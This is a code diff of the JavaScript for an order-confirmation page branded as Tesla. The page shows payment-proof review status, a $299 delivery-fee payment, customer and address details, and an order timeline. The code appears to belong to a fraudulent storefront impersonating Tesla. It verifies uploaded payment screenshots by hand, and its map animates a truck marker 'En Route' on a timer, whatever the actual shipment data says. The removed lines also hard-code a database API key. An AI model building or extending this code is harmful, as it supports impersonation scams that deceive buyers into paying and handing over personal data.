+  var stageLabels = ['Order Confirmed', 'Processing', 'Shipped', 'In Transit', 'Out for Delivery', 'Delivered'];
+  var stageKeys   = ['confirmed', 'processing', 'shipped', 'in_transit', 'out_for_delivery', 'delivered'];
+  var statusLabels = { confirmed: 'Order Confirmed', processing: 'Processing', shipped: 'Shipped', in_transit: 'In Transit', out_for_delivery: 'Out for Delivery', delivered: 'Delivered', pending: 'Pending Review', approved: 'Approved', rejected: 'Rejected' };
+
+  function el(id) { return document.getElementById(id); }
+  function setText(id, v) { var e = el(id); if (e) e.textContent = v || '—'; }
+  function fmt(iso) {
+    if (!iso) return '—';
+    try { return new Date(iso).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }); } catch(e) { return iso; }
+  }
+  function fmtDT(iso) {
+    if (!iso) return '—';
+    try { return new Date(iso).toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' }); } catch(e) { return iso; }
+  }
+
+  function setStatus(proofStatus) {
+    var top = el('heroTop');
+    var icon = el('statusIcon');
+    var title = el('heroTitle');
+    var sub = el('heroSub');
+    var pill = el('statusPill');
+    var st = el('statusText');
+
+    top.className = 'hero-top';
+    if (proofStatus === 'approved') {
+      top.classList.add('approved');
+      if (icon) icon.textContent = '✅';
+      if (title) title.textContent = 'Payment Approved';
+      if (sub) sub.textContent = 'Your payment has been verified and approved. Your Tesla is being prepared for delivery. Track your order progress below.';
+      if (st) st.textContent = 'Payment Approved';
+    } else if (proofStatus === 'rejected') {
+      top.classList.add('rejected');
+      if (icon) icon.textContent = '❌';
+      if (title) title.textContent = 'Payment Rejected';
+      if (sub) sub.textContent = 'Unfortunately your payment could not be verified. Please contact support or resubmit your payment proof.';
+      if (st) st.textContent = 'Payment Rejected';
     } else {
-      ic.innerHTML='<svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';
-      t.textContent="Payment Rejected";
-      sb.textContent="Your payment proof could not be verified. Please submit a new payment proof.";
+      top.classList.add('pending');
+      if (icon) icon.textContent = '⏳';
+      if (title) title.textContent = 'Payment Under Review';
+      if (sub) sub.textContent = 'Your payment proof has been received and is being verified by our team. This typically takes 24–48 hours.';
+      if (st) st.textContent = 'Pending Review';
     }
   }
 
-  function populateOrder(){
-    // Order details
-    var oidEl=document.getElementById("orderId");
-    if(oidEl) oidEl.textContent=oi||"-";
-    if(o){
-      var odEl=document.getElementById("orderDate");
-      if(odEl) odEl.textContent=o.orderDate?new Date(o.orderDate).toLocaleDateString("en-US",{month:"short",day:"numeric",year:"numeric"}):"-";
-      var edEl=document.getElementById("estDelivery");
-      if(edEl) edEl.textContent=o.estimatedDelivery||"-";
-      var dmEl=document.getElementById("delivMethod");
-      if(dmEl) dmEl.textContent=(o.deliveryMethod&&o.deliveryMethod.name)||"-";
-      var pmEl=document.getElementById("payMethod");
-      if(pmEl) pmEl.textContent=(o.paymentMethod&&o.paymentMethod.name)||"-";
-      var d=o.deliveryDetails||{};
-      var cnEl=document.getElementById("customerName");
-      if(cnEl) cnEl.textContent=d.fullName||d.recipientName||"-";
-      var ceEl=document.getElementById("customerEmail");
-      if(ceEl) ceEl.textContent=d.email||"-";
-      var cpEl=document.getElementById("customerPhone");
-      if(cpEl) cpEl.textContent=d.phone||"-";
-      var caEl=document.getElementById("customerAddr");
-      if(caEl) caEl.textContent=[d.address,d.city,d.state,d.zipCode].filter(Boolean).join(", ")||"-";
-      var paEl=document.getElementById("payAmount");
-      if(paEl) paEl.textContent=o.deliveryFeeDisplay||(o.deliveryMethod&&o.deliveryMethod.priceDisplay)||"$299";
-    }
-    // Car
-    if(sc){
-      var carEl=document.getElementById("carName");
-      if(carEl) carEl.textContent="Tesla "+(sc.name||sc.model||"");
-      var imgEl=document.getElementById("carImg");
-      if(imgEl&&sc.img) imgEl.src=sc.img;
-    }
-    var pdEl=document.getElementById("payDate");
-    if(pdEl) pdEl.textContent=new Date().toLocaleString("en-US",{month:"short",day:"numeric",year:"numeric",hour:"2-digit",minute:"2-digit"});
+  function populateOrder(order) {
+    if (!order) return;
+    var sc = order.selectedCar || {};
+    var dd = order.deliveryDetails || {};
+    var dm = order.deliveryMethod || {};
+    var pm = order.paymentMethod || {};
+
+    // Vehicle
+    var carId = String(sc.id || sc.model || sc.name || '').toLowerCase().replace(/\s/g,'').replace('model','model');
+    var imgKey = Object.keys(carImgMap).find(function(k) { return carId.indexOf(k) !== -1 || k.indexOf(carId) !== -1; }) || 'models';
+    var imgEl = el('vehicleImg');
+    if (imgEl) imgEl.src = carImgMap[imgKey] || carImgMap.models;
+    setText('vehicleName', 'Tesla ' + (sc.name || sc.model || 'Model S'));
+    setText('vehiclePrice', sc.price || '—');
+
+    // Order summary
+    setText('orderId', order.orderId);
+    setText('trackingNum', order.trackingNumber);
+    setText('orderDate', fmt(order.orderDate));
+    setText('estDelivery', order.estimatedDelivery || '—');
+    setText('paymentMethod', pm.name || pm.label || pm.type || '—');
+    setText('deliveryMethod', dm.name || dm.label || '—');
+
+    // Customer
+    var user = window._userData || {};
+    setText('custName', (user.firstName || '') + ' ' + (user.lastName || ''));
+    setText('custEmail', user.email || '—');
+    setText('custPhone', user.phone || dd.phone || '—');
+
+    // Delivery address
+    setText('delName', dd.fullName || dd.name || '—');
+    setText('delAddr', dd.address || dd.street || '—');
+    setText('delCity', dd.city || '—');
+    setText('delStateZip', [dd.state, dd.zipCode || dd.zip].filter(Boolean).join(' ') || '—');
+    setText('delCountry', dd.country || '—');
+
+    // Track button
+    var tb = el('trackBtn');
+    if (tb && order.orderId) tb.href = 'track.html?order=' + encodeURIComponent(order.orderId) + '&tracking=' + encodeURIComponent(order.trackingNumber || '');
+
+    // Timeline
+    renderTimeline(order.timeline || [], order.status || 'confirmed');
+
+    // Map
+    setTimeout(function() { initMap(dd); }, 500);
   }
 
-  function render(s){
-    setStatus(s);
-    populateOrder();
+  function renderTimeline(timeline, status) {
+    var steps = el('tlSteps');
+    if (!steps) return;
+
+    var defaultTimeline = stageLabels.map(function(label, i) {
+      return { stage: label, completed: false, timestamp: null };
+    });
+
+    var tl = (timeline && timeline.length > 0) ? timeline : defaultTimeline;
+
+    // Find current step index
+    var doneCount = tl.filter(function(t) { return t.completed; }).length;
+    var pct = tl.length > 0 ? Math.max(5, Math.min(100, (doneCount / tl.length) * 100)) : 5;
+
+    var fill = el('progressFill');
+    if (fill) fill.style.width = pct + '%';
+
+    var progLabel = el('progressLabel');
+    if (progLabel) {
+      var currentStage = tl.filter(function(t) { return t.completed; }).slice(-1)[0];
+      progLabel.textContent = currentStage ? currentStage.stage : 'Order Placed';
+    }
+
+    steps.innerHTML = tl.map(function(step, i) {
+      var isDone = step.completed;
+      var isCurrent = !isDone && i === doneCount;
+      var cls = isDone ? 'done' : (isCurrent ? 'current' : 'upcoming');
+      var icon = isDone ? '✓' : (stageIcons[i] || '○');
+      var timeStr = step.timestamp ? fmtDT(step.timestamp) : (isCurrent ? 'In progress…' : 'Upcoming');
+      var badge = isCurrent ? '<span class="tl-current-badge"><span class="tl-current-dot"></span>Active</span>' : '';
+      return '<div class="tl-step ' + cls + '">' +
+        '<div class="tl-dot">' + icon + '</div>' +
+        '<div class="tl-info">' +
+          '<div class="tl-stage">' + (step.stage || stageLabels[i] || '') + badge + '</div>' +
+          '<div class="tl-time">' + timeStr + '</div>' +
+        '</div>' +
+      '</div>';
+    }).join('');
   }
 
-  window.goToTrack=function(){window.location.href="track.html?order="+encodeURIComponent(oi||"");};
+  var mapInited = false;
+  function initMap(dd) {
+    if (mapInited) return;
+    if (!window.L) return;
+    mapInited = true;
+    var origin = [37.4936, -121.9448]; // Tesla Factory, Fremont CA
+    var dest = [40.7128, -74.0060]; // fallback NYC
+    var city = dd.city || '';
+    var state = dd.state || '';
+    var country = dd.country || '';
+    var map = L.map('confMap').setView([(origin[0]+dest[0])/2, (origin[1]+dest[1])/2], 4);
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', { attribution: '© OpenStreetMap © CARTO', maxZoom: 19 }).addTo(map);
+    var rI = L.divIcon({ html: '<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(227,25,55,.5)"></div>', className: '', iconSize: [14,14], iconAnchor: [7,7] });
+    var gI = L.divIcon({ html: '<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(0,165,80,.5)"></div>', className: '', iconSize: [14,14], iconAnchor: [7,7] });
+    var tI = L.divIcon({ html: '<div style="font-size:20px;line-height:1;">🚚</div>', className: '', iconSize: [24,24], iconAnchor: [12,12] });
+    L.marker(origin, { icon: rI }).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');
+    var destMarker = L.marker(dest, { icon: gI }).addTo(map).bindPopup('<strong>Delivery Destination</strong><br>' + (city ? city + ', ' : '') + country);
+    var truckMarker = L.marker([(origin[0]+dest[0])/2, (origin[1]+dest[1])/2], { icon: tI }).addTo(map).bindPopup('<strong>Your Tesla</strong><br>🚚 En Route');
+    var line = L.polyline([origin, dest], { color: '#E31937', weight: 2.5, opacity: .55, dashArray: '8,8' }).addTo(map);
+    map.fitBounds(L.latLngBounds([origin, dest]), { padding: [40,40] });
+    if (city || country) {
+      fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent([city, state, country].filter(Boolean).join(', ')))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          if (d && d.length) {
+            dest = [parseFloat(d[0].lat), parseFloat(d[0].lon)];
+            destMarker.setLatLng(dest).bindPopup('<strong>Delivery Destination</strong><br>' + (city || '') + (country ? ', ' + country : ''));
+            line.setLatLngs([origin, dest]);
+            map.fitBounds(L.latLngBounds([origin, dest]), { padding: [40,40] });
+          }
+        }).catch(function() {});
+    }
+    var p = 0;
+    setInterval(function() {
+      p = (p + .003) % 1;
+      truckMarker.setLatLng([origin[0]+(dest[0]-origin[0])*p + Math.sin(p*12)*.05, origin[1]+(dest[1]-origin[1])*p + Math.cos(p*12)*.05]);
+    }, 80);
+  }
 
-  // Load live status from Supabase REST API (no SDK dependency)
-  function loadLiveStatus(){
-    if(!oi) { render(st); return; }
-    var SUPABASE_URL = (window.SUPABASE_URL || 'https://puebwzumwqizgbmksrpq.supabase.co');
-    var SUPABASE_ANON_KEY = (window.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw');
-    fetch(SUPABASE_URL + '/rest/v1/payment_proofs?select=status,proof_url&order_id=eq.' + encodeURIComponent(oi) + '&limit=1', {
-      headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + SUPABASE_ANON_KEY }
-    }).then(function(r){ return r.ok ? r.json() : null; })
-    .then(function(rows){
-      if(rows && rows.length > 0){
-        var row = rows[0];
-        var liveStatus = row.status || st;
-        // Update cached order status
-        if(o){ o.status = liveStatus; try{ localStorage.setItem("tesla_last_order", JSON.stringify(o)); }catch(e){} }
-        render(liveStatus);
-        // Show proof preview if URL is a normal URL (not a base64 data blob)
-        if(row.proof_url && !row.proof_url.startsWith('data:')){
-          var ps=document.getElementById("proofPreviewSection");
-          var pp=document.getElementById("proofPreview");
-          if(ps) ps.style.display="block";
-          if(pp) pp.src=row.proof_url;
+  function loadFromDB(orderId) {
+    if (!orderId) return;
+    // Load live order data from API
+    var session = (typeof getSession === 'function') ? getSession() : (localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token'));
+    if (!session) return;
+    apiCall('/session?token=' + encodeURIComponent(session))
+      .then(function(data) {
+        if (data.valid && data.order) {
+          window._userData = data.user;
+          populateOrder(data.order);
         }
-      } else {
-        render(st);
+      })
+      .catch(function() {});
+
+    // Also load live proof status from Supabase REST
+    fetch(SUPABASE_URL + '/rest/v1/payment_proofs?select=status,proof_url,created_at,payment_method&order_id=eq.' + encodeURIComponent(orderId) + '&limit=1', {
+      headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + SUPABASE_ANON_KEY }
+    }).then(function(r) { return r.ok ? r.json() : null; })
+    .then(function(rows) {
+      if (rows && rows.length > 0) {
+        var row = rows[0];
+        setStatus(row.status || 'pending');
+        setText('proofStatus', row.status ? (row.status.charAt(0).toUpperCase() + row.status.slice(1)) : '—');
+        setText('proofDate', row.created_at ? fmtDT(row.created_at) : '—');
+        setText('proofMethod', row.payment_method || '—');
+        if (row.proof_url && !row.proof_url.startsWith('data:')) {
+          var wrap = el('proofImgWrap');
+          var img = el('proofImg');
+          if (wrap) wrap.style.display = 'block';
+          if (img) img.src = row.proof_url;
+        }
       }
-    }).catch(function(){ render(st); });
+    }).catch(function() {});
+
+    // Poll for live tracking status every 30 sec
+    setInterval(function() { loadLiveTracking(orderId); }, 30000);
   }
 
-  populateOrder(); // render order data immediately from localStorage
-  render(st);      // set initial status badge without waiting for API
-  loadLiveStatus(); // then update status from DB asynchronously
+  function loadLiveTracking(orderId) {
+    // Reload timeline from API
+    var session = (typeof getSession === 'function') ? getSession() : (localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token'));
+    if (!session) return;
+    apiCall('/session?token=' + encodeURIComponent(session))
+      .then(function(data) {
+        if (data.valid && data.order) {
+          renderTimeline(data.order.timeline || [], data.order.status || 'confirmed');
+          var progLabel = el('progressLabel');
+          var tl = data.order.timeline || [];
+          var cur = tl.filter(function(t) { return t.completed; }).slice(-1)[0];
+          if (progLabel && cur) progLabel.textContent = cur.stage;
+        }
+      }).catch(function() {});
+  }
+
+  // ── INIT ──────────────────────────────────────────────────────
+  document.addEventListener('DOMContentLoaded', function() {
+    // Try getting order from session first (DB-driven)
+    var session = (typeof getSession === 'function') ? getSession() : (localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token'));
+    var oi = urlOrderId;
+
+    if (session) {
+      apiCall('/session?token=' + encodeURIComponent(session))
+        .then(function(data) {
+          if (data.valid) {
+            window._userData = data.user;
+            if (data.order) {
+              oi = data.order.orderId || oi;
+              populateOrder(data.order);
+            }
+            // Now load proof status from Supabase
+            if (oi) loadFromDB(oi);
+          } else {
+            // No session, fall back to localStorage order data
+            loadFromLocalStorage(oi);
+          }
+        })
+        .catch(function() { loadFromLocalStorage(oi); });
+    } else {
+      loadFromLocalStorage(oi);
+    }
+  });
+
+  function loadFromLocalStorage(oi) {
+    // Fallback: try localStorage for order data
+    try {
+      var stored = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
+      if (stored) {
+        populateOrder(stored);
+        oi = oi || stored.orderId;
+      }
+    } catch(e) {}
+    if (oi) loadFromDB(oi);
+    // Also try proof status
+    if (oi) {
+      fetch(SUPABASE_URL + '/rest/v1/payment_proofs?select=status,proof_url,created_at,payment_method&order_id=eq.' + encodeURIComponent(oi) + '&limit=1', {
+        headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + SUPABASE_ANON_KEY }
+      }).then(function(r) { return r.ok ? r.json() : null; })
+      .then(function(rows) {
+        if (rows && rows.length > 0) {
+          var row = rows[0];
+          setStatus(row.status || 'pending');
+          setText('proofStatus', row.status ? (row.status.charAt(0).toUpperCase() + row.status.slice(1)) : '—');
+          setText('proofDate', row.created_at ? fmtDT(row.created_at) : '—');
+          setText('proofMethod', row.payment_method || '—');
+        }
+      }).catch(function() {});
+    }
+    // Default timeline if nothing
+    renderTimeline([], 'confirmed');
+  }
 })();
 </script>
 </body>
